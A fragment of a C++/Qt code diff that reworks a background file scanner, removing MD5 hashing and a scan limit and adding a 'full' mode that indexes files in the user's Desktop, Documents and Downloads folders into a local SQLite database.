-            QString md5 = "";
-            QFile file(info.absoluteFilePath());
-            if (file.open(QIODevice::ReadOnly)) {
-                QCryptographicHash hash(QCryptographicHash::Md5);
-                if (hash.addData(&file)) {
-                    md5 = hash.result().toHex();
-                }
-                file.close();
-            }
-            
-            sqlite3_bind_text(stmt, 1, info.absoluteFilePath().toUtf8().constData(), -1, SQLITE_TRANSIENT);
-            sqlite3_bind_text(stmt, 2, info.fileName().toUtf8().constData(), -1, SQLITE_TRANSIENT);
-            sqlite3_bind_int64(stmt, 3, info.size());
-            sqlite3_bind_text(stmt, 4, md5.toUtf8().constData(), -1, SQLITE_TRANSIENT);
-            sqlite3_bind_int64(stmt, 5, info.lastModified().toSecsSinceEpoch());
+            sqlite3_bind_text(stmt, 1, entry.absoluteFilePath().toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            sqlite3_bind_text(stmt, 2, entry.fileName().toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            sqlite3_bind_int64(stmt, 3, entry.size());
+            sqlite3_bind_text(stmt, 4, "", -1, SQLITE_TRANSIENT);
+            sqlite3_bind_int64(stmt, 5, entry.lastModified().toSecsSinceEpoch());
             sqlite3_step(stmt);
             sqlite3_reset(stmt);
-            
-            count++;
-            if (count > limit) {
-                Logs::writeMain("HEARTBEAT_DEBUG: Hit limit " + QString::number(limit) + " for path " + path);
-                break;
-            }
         }
+    };
+
+    if (_mode == "full") {
+        QString home = QDir::homePath();
+        scanDir(home + "/Desktop");
+        scanDir(home + "/Documents");
+        scanDir(home + "/Downloads");
+    } else if (!_targetPath.isEmpty()) {
+        scanDir(_targetPath);
     }
 
     sqlite3_exec(db, "COMMIT;", 0, 0, 0);
     sqlite3_finalize(stmt);
     sqlite3_close(db);
-    
-    Logs::writeMain("HEARTBEAT_DEBUG: BackgroundScanner::process finished.");
-    Q_EMIT scanFinished(_taskId, "Scan Completed");
+
+    Q_EMIT scanFinished(_taskId, QByteArray());
 }
 
 } // namespace Core
